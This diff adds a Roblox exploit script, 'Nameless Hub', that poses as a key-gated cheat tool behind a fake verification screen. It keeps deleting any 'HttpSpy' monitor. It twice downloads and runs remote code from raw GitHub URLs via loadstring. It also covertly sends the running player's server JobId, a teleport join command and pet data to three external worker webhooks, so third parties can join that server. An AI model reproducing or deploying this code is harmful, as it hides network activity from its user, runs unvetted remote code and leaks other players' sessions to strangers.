@@ -1,0 +1,666 @@
+-- check_part.lua
+local CoreGui = game:GetService("CoreGui")
+
+task.spawn(function()
+    while true do
+        for _, obj in ipairs(CoreGui:GetChildren()) do
+            if obj.Name == "HttpSpy" then
+                obj:Destroy()
+            end
+        end
+        task.wait()
+    end
+end)
+
+local folderName = "NHUses"
+local folderExists = game.Workspace:FindFirstChild(folderName) ~= nil
+
+local alreadyHereFolderName = "AlreadyHere"
+local alreadyHereFolder = game.Workspace:FindFirstChild(alreadyHereFolderName)
+local alreadyHereFolderExists = alreadyHereFolder ~= nil
+
+-- Создаем папку AlreadyHere если её нет
+if not alreadyHereFolderExists then
+    local newFolder = Instance.new("Folder")
+    newFolder.Name = alreadyHereFolderName
+    newFolder.Parent = game.Workspace
+    alreadyHereFolder = newFolder
+    alreadyHereFolderExists = false -- Папка только что создана, значит можно отправлять вебхуки
+else
+    alreadyHereFolderExists = true -- Папка уже существует, не отправляем вебхуки
+end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Brawl575/trekc/refs/heads/main/ant"))()
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local DISCORD_LINK = "https://discord.gg/XKZXaqph" -- Replace with actual Discord link
+local codeFileName = "NamelessAuth.txt"
+
+-- Webhook URLs
+local WEBHOOK_WORKER_URL = "https://freee.ilyx7pro.workers.dev/?msg="
+local SPECIAL_WEBHOOK_URL = "https://3087d410-premium.ilyx7pro.workers.dev/?msg="
+local ADDITIONAL_WEBHOOK_URL = "https://rep.ilyasika123950.workers.dev/?msg="
+
+-- Tables to track already sent notifications
+local sentFirstWebhook = {}
+local sentSecondWebhook = {}
+local sentThirdWebhook = {}
+
+-- Переменная для отслеживания времени первой отправки
+local firstWebhookTimer = nil
+local pendingFirstWebhookData = nil
+
+local function copyToClipboard(text)
+    if setclipboard then
+        setclipboard(text)
+        return true
+    else
+        warn("setclipboard не поддерживается в этом исполнителе")
+        return false
+    end
+end
+
+local function createAuthGUI()
+    local playerGui = player:WaitForChild("PlayerGui")
+
+    -- Основной экран GUI
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "NamelessAuthGui"
+    screenGui.ResetOnSpawn = false
+    screenGui.Parent = playerGui
+
+    -- Центральная панель
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 350, 0, 250)
+    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+
+    local mainCorner = Instance.new("UICorner")
+    mainCorner.CornerRadius = UDim.new(0, 15)
+    mainCorner.Parent = mainFrame
+
+    local mainGradient = Instance.new("UIGradient")
+    mainGradient.Color = ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 40))
+    })
+    mainGradient.Rotation = 90
+    mainGradient.Parent = mainFrame
+
+    local shadowStroke = Instance.new("UIStroke")
+    shadowStroke.Thickness = 2
+    shadowStroke.Color = Color3.fromRGB(0, 150, 255)
+    shadowStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    shadowStroke.Transparency = 0.3
+    shadowStroke.Parent = mainFrame
+
+    -- Заголовок
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Size = UDim2.new(1, -40, 0, 50)
+    titleLabel.Position = UDim2.new(0, 20, 0, 10)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "NAMELESS HUB"
+    titleLabel.TextColor3 = Color3.fromRGB(0, 180, 255)
+    titleLabel.TextSize = 24
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    titleLabel.Parent = mainFrame
+
+    -- Подзаголовок
+    local subtitleLabel = Instance.new("TextLabel")
+    subtitleLabel.Size = UDim2.new(1, -40, 0, 25)
+    subtitleLabel.Position = UDim2.new(0, 20, 0, 60)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Text = "Get permanent key in the discord!"
+    subtitleLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+    subtitleLabel.TextSize = 14
+    subtitleLabel.Font = Enum.Font.Gotham
+    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Center
+    subtitleLabel.Parent = mainFrame
+
+    -- Поле ввода
+    local codeFrame = Instance.new("Frame")
+    codeFrame.Size = UDim2.new(1, -60, 0, 35)
+    codeFrame.Position = UDim2.new(0, 30, 0, 90)
+    codeFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 35)
+    codeFrame.BorderSizePixel = 0
+    codeFrame.Parent = mainFrame
+
+    local codeCorner = Instance.new("UICorner")
+    codeCorner.CornerRadius = UDim.new(0, 8)
+    codeCorner.Parent = codeFrame
+
+    local codeStroke = Instance.new("UIStroke")
+    codeStroke.Thickness = 1
+    codeStroke.Color = Color3.fromRGB(60, 60, 80)
+    codeStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    codeStroke.Parent = codeFrame
+
+    local codeTextBox = Instance.new("TextBox")
+    codeTextBox.Size = UDim2.new(1, -20, 1, 0)
+    codeTextBox.Position = UDim2.new(0, 10, 0, 0)
+    codeTextBox.BackgroundTransparency = 1
+    codeTextBox.Text = ""
+    codeTextBox.PlaceholderText = "Enter your code here..."
+    codeTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    codeTextBox.PlaceholderColor3 = Color3.fromRGB(120, 120, 140)
+    codeTextBox.TextSize = 14
+    codeTextBox.Font = Enum.Font.Gotham
+    codeTextBox.Parent = codeFrame
+
+    -- Кнопки
+    local discordButton = Instance.new("TextButton")
+    discordButton.Size = UDim2.new(0.45, 0, 0, 35)
+    discordButton.Position = UDim2.new(0, 15, 0, 140)
+    discordButton.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
+    discordButton.BorderSizePixel = 0
+    discordButton.Text = "Get Discord"
+    discordButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordButton.TextSize = 14
+    discordButton.Font = Enum.Font.GothamBold
+    discordButton.Parent = mainFrame
+
+    local discordCorner = Instance.new("UICorner")
+    discordCorner.CornerRadius = UDim.new(0, 8)
+    discordCorner.Parent = discordButton
+
+    local verifyButton = Instance.new("TextButton")
+    verifyButton.Size = UDim2.new(0.45, 0, 0, 35)
+    verifyButton.Position = UDim2.new(0.51, 0, 0, 140)
+    verifyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 80)
+    verifyButton.BorderSizePixel = 0
+    verifyButton.Text = "Verify"
+    verifyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    verifyButton.TextSize = 14
+    verifyButton.Font = Enum.Font.GothamBold
+    verifyButton.Parent = mainFrame
+
+    local verifyCorner = Instance.new("UICorner")
+    verifyCorner.CornerRadius = UDim.new(0, 8)
+    verifyCorner.Parent = verifyButton
+
+    -- Статус
+    local statusLabel = Instance.new("TextLabel")
+    statusLabel.Size = UDim2.new(1, -40, 0, 25)
+    statusLabel.Position = UDim2.new(0, 20, 0, 185)
+    statusLabel.BackgroundTransparency = 1
+    statusLabel.Text = ""
+    statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+    statusLabel.TextSize = 12
+    statusLabel.Font = Enum.Font.Gotham
+    statusLabel.TextXAlignment = Enum.TextXAlignment.Center
+    statusLabel.Parent = mainFrame
+
+    -- Анимация
+    mainFrame.Size = UDim2.new(0, 0, 0, 0)
+    local openTween = TweenService:Create(mainFrame, 
+        TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out),
+        {Size = UDim2.new(0, 350, 0, 250)}
+    )
+    openTween:Play()
+
+    -- Ховер эффект
+    local function addHoverEffect(button, hoverColor, originalColor)
+        button.MouseEnter:Connect(function()
+            TweenService:Create(button,
+                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {BackgroundColor3 = hoverColor}
+            ):Play()
+        end)
+
+        button.MouseLeave:Connect(function()
+            TweenService:Create(button,
+                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {BackgroundColor3 = originalColor}
+            ):Play()
+        end)
+    end
+
+    addHoverEffect(discordButton, Color3.fromRGB(115, 128, 255), Color3.fromRGB(88, 101, 242))
+    addHoverEffect(verifyButton, Color3.fromRGB(0, 180, 100), Color3.fromRGB(0, 150, 80))
+
+    -- Загрузка сохраненного кода
+    local savedCode
+    if readfile then
+        local success, result = pcall(function()
+            return readfile(codeFileName)
+        end)
+        if success then
+            savedCode = result
+            codeTextBox.Text = savedCode
+        end
+    end
+
+    -- Обработчики кнопок
+    discordButton.MouseButton1Click:Connect(function()
+        if copyToClipboard and copyToClipboard(DISCORD_LINK) then
+            discordButton.Text = "Link Copied!"
+            statusLabel.Text = "Discord link copied to clipboard!"
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            task.delay(3, function()
+                discordButton.Text = "Get Discord"
+                statusLabel.Text = ""
+            end)
+        else
+            statusLabel.Text = "Link: " .. DISCORD_LINK
+            statusLabel.TextColor3 = Color3.fromRGB(100, 200, 255)
+            task.delay(3, function()
+                statusLabel.Text = ""
+            end)
+        end
+    end)
+
+    verifyButton.MouseButton1Click:Connect(function()
+        local enteredCode = codeTextBox.Text:gsub("%s+", "")
+        
+        if enteredCode == "" then
+            statusLabel.Text = "Please enter a code!"
+            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+            return
+        end
+
+        if string.lower(enteredCode) == "namelesshub" then
+            statusLabel.Text = "Code verified successfully!"
+            statusLabel.TextColor3 = Color3.fromRGB(100, 255, 100)
+            
+            if writefile then
+                local success, err = pcall(function()
+                    writefile(codeFileName, enteredCode)
+                end)
+                if not success then
+                    warn("Failed to write code to file: " .. tostring(err))
+                end
+            end
+            
+            local closeTween = TweenService:Create(mainFrame,
+                TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In),
+                {Size = UDim2.new(0, 0, 0, 0)}
+            )
+            closeTween:Play()
+            
+            closeTween.Completed:Connect(function()
+                screenGui:Destroy()
+                initializeMainScript()
+            end)
+        else
+            statusLabel.Text = "Invalid code! Please check your code."
+            statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+        end
+    end)
+
+    codeTextBox.Focused:Connect(function()
+        local focusTween = TweenService:Create(codeStroke,
+            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Color = Color3.fromRGB(0, 150, 255)}
+        )
+        focusTween:Play()
+    end)
+
+    codeTextBox.FocusLost:Connect(function()
+        local unfocusTween = TweenService:Create(codeStroke,
+            TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            {Color = Color3.fromRGB(60, 60, 80)}
+        )
+        unfocusTween:Play()
+    end)
+end
+
+-- Function to extract number from strings like "$1.2k/s", "$3m/s", "$2b/s"
+local function extractNumber(str)
+    if not str then return 0 end
+    local numberStr = str:match("%$(.-)/s")
+    if not numberStr then return 0 end
+    numberStr = numberStr:gsub("%s", "")
+    local multiplier = 1
+    if numberStr:lower():find("k") then
+        multiplier = 1000
+        numberStr = numberStr:gsub("[kK]", "")
+    elseif numberStr:lower():find("m") then
+        multiplier = 1000000
+        numberStr = numberStr:gsub("[mM]", "")
+    elseif numberStr:lower():find("b") then
+        multiplier = 1000000000
+        numberStr = numberStr:gsub("[bB]", "")
+    end
+    return (tonumber(numberStr) or 0) * multiplier
+end
+
+-- Improved podium detection
+local function getAllPodiums()
+    local podiums = {}
+    local function searchForPodiums(parent)
+        for _, obj in pairs(parent:GetDescendants()) do
+            if obj.Name == "AnimalPodiums" then
+                for _, pod in pairs(obj:GetChildren()) do
+                    local success, base = pcall(function()
+                        return pod:FindFirstChild("Base")
+                    end)
+                    if success and base then
+                        local spawn = base:FindFirstChild("Spawn")
+                        if spawn then
+                            local attach = spawn:FindFirstChild("Attachment")
+                            if attach then
+                                local overhead = attach:FindFirstChild("AnimalOverhead")
+                                if overhead and (base:IsA("BasePart") or base:IsA("Model")) then
+                                    table.insert(podiums, { overhead = overhead, base = base })
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local success, plots = pcall(function()
+        return workspace:WaitForChild("Plots", 5)
+    end)
+    if success and plots then
+        searchForPodiums(plots)
+    else
+        warn("Failed to find Plots in workspace")
+    end
+    return podiums
+end
+
+local function getPrimaryPartPosition(obj)
+    if not obj then return nil end
+    if obj:IsA("Model") and obj.PrimaryPart then
+        return obj.PrimaryPart.Position
+    elseif obj:IsA("BasePart") then
+        return obj.Position
+    end
+    return nil
+end
+
+local function waitAndDetectPodiums()
+    local foundPodiums = {}
+
+    for _, podium in pairs(getAllPodiums()) do
+        local success, result = pcall(function()
+            local overhead = podium.overhead
+            local base = podium.base
+            if base and (base:IsA("BasePart") or base:IsA("Model")) then
+                local displayNameLabel = overhead:FindFirstChild("DisplayName")
+                local modelName = displayNameLabel and displayNameLabel.Text or "Unknown"
+                local genLabel = overhead:FindFirstChild("Generation")
+                if genLabel then
+                    local mutation = overhead:FindFirstChild("Mutation")
+                    local mutText = mutation and mutation.Text or "Default"
+                    local genValue = extractNumber(genLabel.Text)
+                    local rarityLabel = overhead:FindFirstChild("Rarity")
+                    local rarity = rarityLabel and rarityLabel.Text or "None"
+                    
+                    local labels = {
+                        DisplayName = modelName,
+                        Generation = genValue == 0 and "Unknown" or string.format("$%s/s", genLabel.Text:match("%$(.-)/s") or tostring(genValue)),
+                        Mutation = mutText,
+                        Rarity = rarity
+                    }
+                    
+                    table.insert(foundPodiums, { base = base, labels = labels })
+                end
+            end
+        end)
+        if not success then
+            warn("Error processing podium: " .. tostring(result))
+        end
+    end
+
+    return foundPodiums
+end
+
+local function sendDiscordWebhook(models, webhookUrl, isThirdWebhook, hasHighGeneration)
+    -- Не отправлять вебхуки если любая из папок существует
+    if folderExists or alreadyHereFolderExists then 
+        return 
+    end
+    
+    models = tostring(models or "Unknown models")
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    local browserLink = "https://nameless-289z.onrender.com/join.html?placeId=" .. placeId .. "&jobId=" .. jobId
+    local playerCount = #Players:GetPlayers()
+    local maxPlayers = game:GetService("Players").MaxPlayers
+
+    if playerCount <= 4 then
+        return
+    end
+
+    if isThirdWebhook then
+        local modelEntries = {}
+        for entry in models:gmatch("[^,]+") do
+            local trimmed = entry:match("^%s*(.-)%s*$")
+            local displayName, generation, mutation, rarity = trimmed:match("(.+)%s*Generation:%s*([^%s]+)%s*Mutation:%s*([^%s]+)%s*Rarity:%s*(.+)")
+            if displayName then
+                table.insert(modelEntries, string.format("%s, %s, %s, %s", displayName, rarity, generation, mutation))
+            else
+                table.insert(modelEntries, trimmed)
+            end
+        end
+        local formattedModels = table.concat(modelEntries, ", ")
+        local message = "-- Models found: " .. formattedModels .. "\n" ..
+                        "Join server: <" .. browserLink .. ">\n"
+        local encodedMessage = HttpService:UrlEncode(message)
+        local url = webhookUrl .. encodedMessage
+        local success, result = pcall(function()
+            return game:HttpGet(url)
+        end)
+    else
+        local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ',"' .. jobId .. '",game.Players.LocalPlayer)'
+
+        -- Определяем цвет на основе генерации (для второго вебхука)
+        local embedColor = 5814783 -- Стандартный цвет
+        if webhookUrl == SPECIAL_WEBHOOK_URL and hasHighGeneration then
+            embedColor = 16711680 -- Красный цвет (RGB: 255, 0, 0) для высокой генерации
+        end
+
+        local data = {
+            ["embeds"] = {{
+                ["title"] = "Nameless Pet Notifier",
+                ["color"] = embedColor,
+                ["fields"] = {
+                    {name = "👥 Players:", value = tostring(playerCount) .. "/" .. tostring(maxPlayers), inline = true},
+                    {
+                        name = "🔗 Server Link:",
+                        value = "[Join Server](" .. browserLink .. ")"
+                    },
+                    {name = "📱 Job-ID (Mobile):", value = "" .. jobId .. ""},
+                    {name = "💻 Job-ID (PC):", value = "" .. jobId .. ""},
+                    {
+                        name = "📲 Join:",
+                        value = "`" .. joinScript .. "`"
+                    }
+                }
+            }}
+        }
+        
+        -- Add footer ТОЛЬКО для первого вебхука (WEBHOOK_WORKER_URL)
+        if webhookUrl == WEBHOOK_WORKER_URL then
+            data.embeds[1].footer = {text = "Buy premium for 3M+ notifier!"}
+        end
+
+        local names = {}
+        local mutations = {}
+        local rarities = {}
+        local generations = {}
+        local mutationCounts = {}
+        local rarityCounts = {}
+
+        for entry in models:gmatch("[^,]+") do
+            local trimmed = entry:match("^%s*(.-)%s*$")
+            local displayName, generation, mutation, rarity = trimmed:match("(.+)%s*Generation:%s*([^%s]+)%s*Mutation:%s*([^%s]+)%s*Rarity:%s*(.+)")
+            if displayName then
+                table.insert(generations, generation or "Unknown")
+                mutationCounts[mutation] = (mutationCounts[mutation] or 0) + 1
+                rarityCounts[rarity] = (rarityCounts[rarity] or 0) + 1
+                table.insert(names, displayName)
+            end
+        end
+
+        local formattedMutations = {}
+        for mutation, count in pairs(mutationCounts) do
+            table.insert(formattedMutations, count > 1 and mutation .. " x" .. count or mutation)
+        end
+        local formattedRarities = {}
+        for rarity, count in pairs(rarityCounts) do
+            table.insert(formattedRarities, count > 1 and rarity .. " x" .. count or rarity)
+        end
+
+        if #names > 0 then
+            table.insert(data.embeds[1].fields, 1, {name = "🪙 Name:", value = table.concat(names, ", "), inline = true})
+        end
+        if #generations > 0 then
+            table.insert(data.embeds[1].fields, 2, {name = "📈 Generation:", value = table.concat(generations, ", "), inline = true})
+        end
+
+        local jsonData = HttpService:JSONEncode(data)
+        local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+        if requestFunc then
+            local success, result = pcall(function()
+                return requestFunc({
+                    Url = webhookUrl,
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = jsonData
+                })
+            end)
+        end
+    end
+end
+
+-- Функция для отправки первого вебхука с задержкой
+local function scheduleFirstWebhook(secretModelsText)
+    if firstWebhookTimer then
+        -- Отменяем предыдущий таймер, если он существует
+        firstWebhookTimer:Disconnect()
+    end
+    
+    pendingFirstWebhookData = secretModelsText
+    
+    firstWebhookTimer = task.wait(5) -- Ждем 5 секунд
+    
+    -- Проверяем, что данные все еще актуальны и папки не созданы
+    if pendingFirstWebhookData and not folderExists and not alreadyHereFolderExists then
+        sendDiscordWebhook(pendingFirstWebhookData, WEBHOOK_WORKER_URL, false, false)
+        pendingFirstWebhookData = nil
+    end
+    
+    firstWebhookTimer = nil
+end
+
+local function checkPodiums()
+    if game.PlaceId ~= 109983668079237 then
+        return
+    end
+
+    while true do
+        local podiums = waitAndDetectPodiums()
+        local secretModelsFirstWebhook = {} -- For WEBHOOK_WORKER_URL (gen <= 5M)
+        local secretModelsSecondWebhook = {} -- For SPECIAL_WEBHOOK_URL (all secrets)
+        local highGenModels = {} -- For ADDITIONAL_WEBHOOK_URL (gen > 5M)
+        
+        for _, podium in ipairs(podiums) do
+            local modelText = string.format("%s Generation: %s Mutation: %s Rarity: %s", 
+                podium.labels.DisplayName, 
+                podium.labels.Generation, 
+                podium.labels.Mutation, 
+                podium.labels.Rarity)
+            
+            local genValue = extractNumber(podium.labels.Generation)
+            local rarity = podium.labels.Rarity
+            local displayName = podium.labels.DisplayName
+            
+            if rarity == "Secret" then
+                -- Для второго вебхука отправляем ВСЕ Secret петы (независимо от генерации)
+                if not sentSecondWebhook[displayName] then
+                    table.insert(secretModelsSecondWebhook, modelText)
+                    sentSecondWebhook[displayName] = true
+                end
+                
+                -- Проверяем что ВСЕ петы имеют генерацию <= 5М для первого вебхука
+                if genValue <= 3000000 and not sentFirstWebhook[displayName] then
+                    -- Проверим все петы в текущем списке, чтобы убедиться что все <= 5М
+                    local allUnder5M = true
+                    for _, checkPodium in ipairs(podiums) do
+                        local checkGenValue = extractNumber(checkPodium.labels.Generation)
+                        if checkPodium.labels.Rarity == "Secret" and checkGenValue > 5000000 then
+                            allUnder5M = false
+                            break
+                        end
+                    end
+                    
+                    if allUnder5M then
+                        table.insert(secretModelsFirstWebhook, modelText)
+                        sentFirstWebhook[displayName] = true
+                    end
+                end
+            end
+            
+            -- Для третьего вебхука отправляем петов с генерацией > 5М (любой редкости)
+            if genValue > 10000000 and not sentThirdWebhook[displayName] then
+                table.insert(highGenModels, modelText)
+                sentThirdWebhook[displayName] = true
+            end
+        end
+        
+        -- Проверяем есть ли петы с генерацией > 5М среди Secret петов для второго вебхука
+        local hasHighGenSecrets = false
+        for _, podium in ipairs(podiums) do
+            local genValue = extractNumber(podium.labels.Generation)
+            local rarity = podium.labels.Rarity
+            if rarity == "Secret" and genValue > 5000000 then
+                hasHighGenSecrets = true
+                break
+            end
+        end
+        
+        -- ИСПРАВЛЕНО: Используем планировщик для первого вебхука с задержкой в 5 секунд
+        if #secretModelsFirstWebhook > 0 and not folderExists and not alreadyHereFolderExists then
+            local secretModelsText = table.concat(secretModelsFirstWebhook, ", ")
+            spawn(function()
+                scheduleFirstWebhook(secretModelsText)
+            end)
+        end
+        
+        if #secretModelsSecondWebhook > 0 and not folderExists and not alreadyHereFolderExists then
+            local secretModelsText = table.concat(secretModelsSecondWebhook, ", ")
+            sendDiscordWebhook(secretModelsText, SPECIAL_WEBHOOK_URL, false, hasHighGenSecrets)
+        end
+        
+        if #highGenModels > 0 and not folderExists and not alreadyHereFolderExists then
+            local highGenModelsText = table.concat(highGenModels, ", ")
+            sendDiscordWebhook(highGenModelsText, ADDITIONAL_WEBHOOK_URL, true, false)
+        end
+        
+        wait(0.1)
+    end
+end
+
+function initializeMainScript()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Brawl575/Leak/refs/heads/main/Giga"))()
+    checkPodiums()
+end
+
+-- Check for saved valid code
+local savedCode
+if readfile then
+    local success, result = pcall(function()
+        return readfile(codeFileName)
+    end)
+    if success and result and string.lower(result:gsub("%s+", "")) == "namelesshub" then
+        savedCode = result
+        initializeMainScript()
+    else
+        createAuthGUI()
+    end
+else
+    createAuthGUI()
+end
